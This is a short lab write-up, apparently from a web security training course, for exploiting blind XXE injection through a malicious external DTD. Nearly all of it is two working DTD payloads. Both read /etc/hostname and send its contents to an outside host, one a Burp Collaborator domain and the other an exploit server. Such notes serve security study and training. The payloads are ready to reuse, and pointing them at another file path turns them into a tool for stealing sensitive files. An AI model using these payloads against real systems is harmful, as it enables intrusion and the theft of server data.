Lab 5 - Exploiting blind XXE to exfiltrate data using a malicious external DTD

Target Goal - Exploit XXE injection to exfiltrate the content of the /etc/hostname file.

Analysis:


Burp Collaborator
------------------

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://8bkjkzuczie7f8yiooilk6010s6iu7.oastify.com/?X=%file;'>">
%eval;
%exfil;

Without Burp Collaborator
-------------------------

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a36000204174338c4c637de0106008f.exploit-server.net/?X=%file;'>">
%eval;
%exfil;